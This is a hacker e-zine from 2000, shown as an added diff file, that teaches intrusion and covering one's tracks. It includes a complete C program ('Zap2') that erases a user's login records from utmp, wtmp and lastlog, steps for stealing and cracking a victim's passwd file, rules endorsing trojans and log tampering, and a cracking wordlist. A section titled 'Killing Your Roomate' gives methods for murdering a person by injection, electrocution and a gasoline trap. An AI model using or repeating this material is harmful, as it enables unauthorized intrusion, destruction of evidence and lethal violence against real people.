@@ -1,0 +1,490 @@
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><
+--------------------------------------------
+<^>WELCOME TO THE FUCKED UP INDUSTRIES<^>
+
+<^>T.F.U.I<^>
+--------------------------------------------
+THE *SECOND*
+T.F.U.I
+E-MAGAZINE!
+#######################
+WRITTEN BY\ Nectron
+THE FOUNDER OF
+T.F.U.I
+<>......................<>
+supported by\ BrainCoder
+THE WEBMASTER OF
+T.F.U.I
+#######################
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><
+This E-Magazine was Written in\ September\2000
+By " Nectron ".
+Issue # 2                (BEST VIEWED IN WORDPAD)
+=======================================================================
+
+Index:
+1- How To Become a hacker.
+
+2- How To Erase UNIX logs.
+
+3- Gaining Information About A Specific Computer.
+
+4- Get the passwd file in the easy way!
+
+5- What To Do If You Get Busted.
+
+6- The Hacker Personality.
+
+7- Killing Your Roomate.
+
+8- Books You SHOULD have.
+
+9- Our Words.
+
+10- Important Things!.
+
+11- Password List.
+=======================================================================
+
+1- How To Become A Hacker:
+If You Think Hacking Is Getting Those Colored Screens like in the movie 
+(HACKERS), Then You're In Deep Shit.
+Let's Get A Basic idea about hacking...
+Hacking Is not getting into NASA's computer and reading about yourself in 
+the newspaper..NO NO NO.
+Hacking is studying about computer systems, And Security flaws.
+It's true that getting into NASA's computer makes you feel like you own the 
+universe, but you wont own the universe until you learn a lot about 
+computers, and explore It's world.
+I know that you feel like lost, But here are some steps that will %100 teach 
+you and lead you to the hacker world:
+A- Search for (hacking text files, how to become a hacker, hacking UNIX 
+systems, etc..) In the internet, you'll find a lot of them...
+Download ALL the (hacking texts) you see, READ READ READ READ..
+Now, You Don't Even Know Shit About Computers.
+You still feel lost, There Are Somethings That Confuse you, i know it.
+B- The fastest way to know more is to buy Some Books About Computer Hacking 
+such as "HACKING EXPOSED" (my favourite), this book will TEACH you step by 
+step how to get into UNIX, NT, Novel, And Netware.
+C- You Have WINDOWS???
+big mistake!! buy yourself "RedHat Linux", In order to follow what the books 
+say you HAVE to get linux fast, buy it, or download it.
+D- linux is hard for you?
+ok, play with it  A LOT, After 6 Monthes you're ready to do what the books 
+tell you.
+E- you have hacked a system?
+good, But Until now YOU ARE NOT A HACKER YET.
+You have to learn C, C++, And ASM programming, when done of that, then 
+you're a hacker.
+--------------------
+
+2- How To Erase UNIX logs:
+Edit /etc/utmp, /usr/adm/wtmp and /usr/adm/lastlog. These are not text
+files that can be edited by hand with vi, you must use a program
+specifically written for this purpose.
+Example:
+
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#define WTMP_NAME "/usr/adm/wtmp"
+#define UTMP_NAME "/etc/utmp"
+#define LASTLOG_NAME "/usr/adm/lastlog"
+
+int f;
+
+void kill_utmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+
+  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
+        while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
+          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                          bzero((char *)&utmp_ent,sizeof( utmp_ent ));
+                          lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
+                          write (f, &utmp_ent, sizeof (utmp_ent));
+                  }
+        close(f);
+  }
+}
+
+void kill_wtmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+    long pos;
+
+    pos = 1L;
+    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
+
+        while(pos != -1L) {
+           lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
+           if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
+                pos = -1L;
+           } else {
+                if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                        bzero((char *)&utmp_ent,sizeof(struct utmp ));
+                        lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
+                        write (f, &utmp_ent, sizeof (utmp_ent));
+                        pos = -1L;
+                } else pos += 1L;
+           }
+        }
+        close(f);
+  }
+}
+
+void kill_lastlog(who)
+char *who;
+{
+    struct passwd *pwd;
+    struct lastlog newll;
+
+        if ((pwd=getpwnam(who))!=NULL) {
+
+           if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
+                  lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
+                  bzero((char *)&newll,sizeof( newll ));
+                  write(f, (char *)&newll, sizeof( newll ));
+                  close(f);
+           }
+
+    } else printf("%s: ?\n",who);
+}
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+    if (argc==2) {
+           kill_lastlog(argv[1]);
+           kill_wtmp(argv[1]);
+           kill_utmp(argv[1]);
+           printf("Zap2!\n");
+    } else
+    printf("Error.\n");
+}
+--------------------
+
+3- Gaining Information About A Specific Computer:
+Ever wanted to know some information about your ISP? but you have windows?
+ok,
+first, you need to go to www.altavista.com, then search for "WhoIs 
+Services",Go to a website that offers this command for free, now search for 
+"target.com" without the "'s, you'll see that admin's name, and the 
+location, and such information.
+want some Emails on that computer?
+just type\ @target.com
+you see all of these members and phone numbers?
+if you're up to it, you might try some kung fu!!
+--------------------
+
+4- Get the passwd file in the easy way!:
+download a portscanner, scan your victim for open ports, if you dont know 
+what the hell is goin' on, then you're in deep shit.
+got the FTP port open?, ok if your vicitim is stupid (most of them are), 
+then connect to FTP port and type "cat passwd", if you got that file, then 
+type "get passwd" now you have the password file, crack it by any passwd 
+cracker such as crackerjack or john the ripper.
+if a * appears in the encrypted password section, then the passwd file is 
+shawdowed, try to find the passwd file in another place.
+dont know how does the shadowed file look like??
+ok, here is one:
+# $FreeBSD: src/etc/master.passwd,v 1.25 1999/09/13 17:09:07 peter Exp $
+#
+root:*:0:0:Charlie &:/root:/bin/csh
+toor:*:0:0:Bourne-again Superuser:/root:
+daemon:*:1:1:Owner of many system processes:/root:/sbin/nologin
+operator:*:2:5:System &:/:/sbin/nologin
+bin:*:3:7:Binaries Commands and Source,,,:/:/sbin/nologin
+tty:*:4:65533:Tty Sandbox:/:/sbin/nologin
+kmem:*:5:65533:KMem Sandbox:/:/sbin/nologin
+games:*:7:13:Games pseudo-user:/usr/games:/sbin/nologin
+news:*:8:8:News Subsystem:/:/sbin/nologin
+man:*:9:9:Mister Man Pages:/usr/share/man:/sbin/nologin
+ftp:*:14:2000:EUA Anonymous FTP Server:/home/eua/ftp:/nonexistent
+--------------------
+
+5- What To Do If You Get Busted:
+why are you reading this??
+you think you're gonna get busted?
+well, i just dont care, but here is what to do if you get busted by the 
+feds:
+A. Shut your mouth.
+B. No matter what kind of deals they offer you, give them the finger, and 
+ask for your phonecall, you have the right to ask for your phone call.
+C. Call Someone, and get some help.
+D. If they try to bother you, by speaking loud, or touching you, SCREAM as 
+loud as you can, and tell them that your stomach hurts you!!! :)
+E. If they talk about what you did, say "i dont understand what you're 
+sayin' ", and act like a person who doesn't know what a computer is, you'll 
+be free.
+--------------------
+
+6- The Hacker Personality:
+Are you A hacker?
+Is Reading UNIX manuals, or Learning programing makes you feel bored, while 
+other friends, are out there drinking beer, and having fun??
+well, We "HACKERS" can enjoy our work with the maximum fun!!
+how?
+ok..
+I know that reading books suck, and Spending time on writing a program makes 
+you feel bored, BUT!!
+you can make learning a BEER, GIRLS, AND ROCK MUSIC PARTY!!!!!!! :)
+How???
+yes, ask me...
+Call your GF, and your best friends, "hackers are recommended" with thier 
+laptops of course!
+tell them that you have a party in your place.
+Leave this Keyboard and go buy the following:
+A. 3 boxes of a great beer. "wine will make you forget Codes :) "
+B. The Best Music CD In Stores.
+C. Colored Lamps.
+D. ORDER SOME FOOD.
+When Others Come, The place should be like in SciFi movies, Loud Music, Dark 
+place, And Compters, When HAckers Come, Enjoy A little, And start your 
+computers, share programming, and HACK a little, dance and drink beer!!
+that means you should mix your love of hacking and programming with the 
+Entertainment, listen to RobZombie's music when hacking, Turn off the 
+lights, And PARTY!!
+we are Knowledge seekers, And FUN havers!
+We should tell others that we're better than them, look at people who listen 
+to "BackStreet Boys" they suck, they dont know shit About this world, they 
+have no future, And look at us, we have fun 24 hours a day, and we read and 
+program 24 hours a day, we are super in the class room, we are super in 
+Parties, And super in our work in the future.
+a real hacker can manage tens of networks, but a "BackStreet Boys" lover 
+doesn't even know windows!
+in few words, others are just cows! we're scintists and fun people!
+--------------------
+
+7- Killing Your Roomate:
+So you have a roomate that bothers you like hell, and you're thinking to End 
+his life??
+well, i'm not a super anarchist but, i can destroy the world i guess..
+there are several ways to kill that your roomate!
+1- Take a needle and heat some horse shit and clean the shit of what the 
+horse ate, take some human blood, mix it with the shit, heat them together 
+very slowly, and when the ixture bubbles put it in the needle, you know what 
+to do next! (that will kill him in a week)
+2- Take a strong needle (i'm a DR.) put some gasoline in it, turn off the 
+lights, insert the needle in a all lamps in the room, and get out, when your 
+roomate turns the lights on, BOOM!!
+3- When your roomate sleeps, Take a needle (haha), put some air, and insert 
+the air inside your roomate blood stream, when the air bubbles go to the 
+head, he'll pop!!
+4- want to kill your roomate without touching him??
+ok, get out of the room, outside you'll see the main electicity Boxs,open 
+it... you'll see a large wire, cut it carefully ( touching the metal inside 
+will make you a hotdog!), put the metal wires on the door handle, nock on 
+the door (make sure the door is not metal too!), when your roomate touchs 
+the door handle, zenzeen zeeeenzenen ahhhhhh ahh!
+he's dead!
+--------------------
+
+8- Books You SHOULD have:
+the following books are the best to learn hacking, and are the best to keep 
+you a hacker...
+1- HACKING EXPOSED.
+2- Maximum linux security.
+3- C for bigenners.
+4- Learn linux in 24 hours.
+5- The fugitive game. (Kevin Mitnick's Story)
+
+--------------------
+
+9- Our Words:
+Hackers are born to read, explore, and create....
+No matter what they do with thier knowledge, There is nothing called HACKERS 
+VS CRACKERS, we are all hackers, We are all some of the best people on 
+earth, Beacause, we run the most important things on this planet, we take 
+care of the most dangerous things on this planet, All of us have the ability 
+to do that, but there is good and evil, this is the life...
+Some people use thier knowledge for good, and some of them use it to harm 
+others.
+We dont care what people say about us, some of them think that we're 
+geniusses, some of them think that we're sci-fi movie lovers...
+because they cant do what we do, they hate to learn important things, 
+because it's hard to them, all they care about is (BackStreet Boys, 
+BasketBall, And Money), isn't that right????
+So, i wont talk much about this, our words to the BackStret Boys fans, Don't 
+Ever think that your something big, wanna be big?
+READ, EXPLORE, AND CREATE! (not "Backstreet's Back alright" ) hahahaa.
+
+--------------------
+
+10- Important Things:
+These Words Are copied from one of the first text files i've read to become 
+a hacker, it was written by "VoiD", They Are very important to know:
+
+I.    Do not intentionally damage *any* system.
+II.   Do not alter any system files other than ones needed to ensure your
+      escape from detection and your future access (Trojan Horses, Altering
+      Logs, and the like are all necessary to your survival for as long as
+      possible.)
+III.  Do not leave your (or anyone else's) real name, real handle, or real
+      phone number on any system that you access illegally.  They *can* and
+      will track you down from your handle!
+IV.   Be careful who you share information with.  Feds are getting trickier.
+      Generally, if you don't know their voice phone number, name, and
+      occupation or haven't spoken with them voice on non-info trading
+      conversations, be wary.
+V.    Do not leave your real phone number to anyone you don't know.  This
+      includes logging on boards, no matter how k-rad they seem.  If you
+      don't know the sysop, leave a note telling some trustworthy people
+      that will validate you.
+VI.   Do not hack government computers.  Yes, there are government systems
+      that are safe to hack, but they are few and far between.  And the
+      government has inifitely more time and resources to track you down 
+than
+      a company who has to make a profit and justify expenses.
+VII.  Don't use codes unless there is *NO* way around it (you don't have a
+      local telenet or tymnet outdial and can't connect to anything 800...)
+      You use codes long enough, you will get caught.  Period.
+VIII. Don't be afraid to be paranoid.  Remember, you *are* breaking the law.
+      It doesn't hurt to store everything encrypted on your hard disk, or
+      keep your notes buried in the backyard or in the trunk of your car.
+      You may feel a little funny, but you'll feel a lot funnier when you
+      when you meet Bruno, your transvestite cellmate who axed his family to
+      death.
+IX.   Watch what you post on boards.  Most of the really great hackers in 
+the
+      country post *nothing* about the system they're currently working
+      except in the broadest sense (I'm working on a UNIX, or a COSMOS, or
+      something generic.  Not "I'm hacking into General Electric's Voice 
+Mail
+      System" or something inane and revealing like that.)
+X.    Don't be afraid to ask questions.  That's what more experienced 
+hackers
+      are for.  Don't expect *everything* you ask to be answered, though.
+      There are some things (LMOS, for instance) that a begining hacker
+      shouldn't mess with.  You'll either get caught, or screw it up for
+      others, or both.
+XI.   Finally, you have to actually hack.  You can hang out on boards all 
+you
+      want, and you can read all the text files in the world, but until you
+      actually start doing it, you'll never know what it's all about.  
+There's
+      no thrill quite the same as getting into your first system (well, ok,
+      I can think of a couple of bigger thrills, but you get the picture.)
+
+--------------------
+
+11- Password List:
+well, some of you know what to do with this, some of you dont, anyway, you 
+can use this for a password cracker, which uses word lists to crack 
+passwords, or you can ENJOY readin' it!  hahahahaha :^)
+
+"PASSWORD LIST"
+
+
+
+
+      aaa                daniel             jester             rascal
+      academia           danny              johnny             really
+      ada                dave               joseph             rebecca
+      adrian             deb                joshua             remote
+      aerobics           debbie             judith             rick
+      airplane           deborah            juggle             reagan
+      albany             december           julia              robot
+      albatross          desperate          kathleen           robotics
+      albert             develop            kermit             rolex
+      alex               diet               kernel             ronald
+      alexander          digital            knight             rosebud
+      algebra            discovery          lambda             rosemary
+      alias              disney             larry              roses
+      alpha              dog                lazarus            ruben
+      alphabet           drought            lee                rules
+      ama                duncan             leroy              ruth
+      amy                easy               lewis              sal
+      analog             eatme              light              saxon
+      anchor             edges              lisa               scheme
+      andy               edwin              louis              scott
+      andrea             egghead            lynne              scotty
+      animal             eileen             mac                secret
+      answer             einstein           macintosh          sensor
+      anything           elephant           mack               serenity
+      arrow              elizabeth          maggot             sex
+      arthur             ellen              magic              shark
+      asshole            emerald            malcolm            sharon
+      athena             engine             mark               shit
+      atmosphere         engineer           markus             shiva
+      bacchus            enterprise         marty              shuttle
+      badass             enzyme             marvin             simon
+      bailey             euclid             master             simple
+      banana             evelyn             maurice            singer
+      bandit             extension          merlin             single
+      banks              fairway            mets               smile
+      bass               felicia            michael            smiles
+      batman             fender             michelle           smooch
+      beauty             fermat             mike               smother
+      beaver             finite             minimum            snatch
+      beethoven          flower             minsky             snoopy
+      beloved            foolproof          mogul              soap
+      benz               football           moose              socrates
+      beowulf            format             mozart             spit
+      berkeley           forsythe           nancy              spring
+      berlin             fourier            napoleon           subway
+      beta               fred               network            success
+      beverly            friend             newton             summer
+      bob                frighten           next               super
+      brenda             fun                olivia             support
+      brian              gabriel            oracle             surfer
+      bridget            garfield           orca               suzanne
+      broadway           gauss              orwell             tangerine
+      bumbling           george             osiris             tape
+      cardinal           gertrude           outlaw             target
+      carmen             gibson             oxford             taylor
+      carolina           ginger             pacific            telephone
+      caroline           gnu                painless                       
+temptation
+      castle             golf               pam                tiger
+      cat                golfer             paper              toggle
+      celtics            gorgeous           password           tomato
+      change             graham             pat                toyota
+      charles            gryphon            patricia           trivial
+      charming           guest              penguin            unhappy
+      charon             guitar             pete               unicorn
+      chester            hacker             peter              unknown
+      cigar              harmony            philip             urchin
+      classic            harold             phoenix            utility
+      coffee             harvey             pierre             vicky
+      coke               heinlein           pizza              virginia
+      collins            hello              plover             warren
+      comrade            help               polynomial         water
+      computer           herbert            praise             weenie
+      condo              honey              prelude            whatnot
+      condom             horse              prince             whitney
+      cookie             imperial           protect            will
+      cooper             include            pumpkin            william
+      create             ingres             puppet             willie
+      creation           innocuous          rabbit             winston
+      creator            irishman           rachmaninoff       wizard
+      cretin             isis               rainbow            wombat
+      daemon             japan              raindrop           yosemite
+      dancer             jessica            random             zap
+-----------------------------------------------------------------------
+
+
+
+
++++++++++++++++++++++++++++++++++EOF++++++++++++++++++++++++++++++++++
+
+=================================================================================================================
+==================
+<^>THE FUCKED UP INDUSTRIES<^>
+<^>T.F.U.I<^>
+YEAR\2000
+==================
+==========================================
+=======================================================================
+<!-- text below generated by server. PLEASE REMOVE 
+--></table></script></style></noscript>
+
+
